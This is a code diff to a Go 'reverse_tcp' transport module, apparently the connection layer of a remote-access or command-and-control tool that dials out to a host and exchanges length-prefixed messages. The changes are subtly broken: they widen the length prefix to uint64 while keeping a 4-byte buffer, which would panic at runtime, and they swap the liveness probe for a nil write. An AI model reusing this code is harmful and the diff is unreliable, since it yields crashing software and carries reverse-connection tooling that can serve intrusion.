@@ -35,9 +35,9 @@ type reverse_tcpInit struct{
 }
 
 func (r *reverse_tcpFloo) Send(data []byte) (error) {
-	dataLen := uint32(len(data))
+	dataLen := uint64(len(data))
 	dataLenBuf := make([]byte, 4)
-	binary.BigEndian.PutUint32(dataLenBuf, dataLen)
+	binary.BigEndian.PutUint64(dataLenBuf, dataLen)
 
 	if _, err := r.conn.Write(dataLenBuf); err != nil {
 		return fmt.Errorf("send: failed to send data len: %w", err)
@@ -60,7 +60,7 @@ func (r *reverse_tcpFloo) Receive() ([]byte, error) {
 
 	}
 	
-	lenBuf := binary.BigEndian.Uint32(dataLenBuf)
+	lenBuf := binary.BigEndian.Uint64(dataLenBuf)
 	data := make([]byte, lenBuf)
 
 	if _, err := io.ReadFull(r.conn, data); err != nil {
@@ -79,7 +79,7 @@ func (r *reverse_tcpFloo) Close() (error) {
 
 func (r *reverse_tcpFloo) IsActive() (bool) {
 	_ = r.conn.SetWriteDeadline(time.Now().Add(time.Millisecond * 900))
-	_, err := r.conn.Write([]byte("are you alive??"))
+	_, err := r.conn.Write([]byte(nil))
 	r.conn.SetWriteDeadline(time.Time{})
 	return err == nil
 
@@ -94,7 +94,7 @@ func (t reverse_tcpInit) InitArcane() (*types.ArcaneLink, error) {
 		return &types.ArcaneLink{}, fmt.Errorf("can't reach host %s, check it and try again", host)
 	
 	}
-
+	
 	connection, err := net.Dial("tcp", connString)
 	if err != nil {
 		return &types.ArcaneLink{}, err
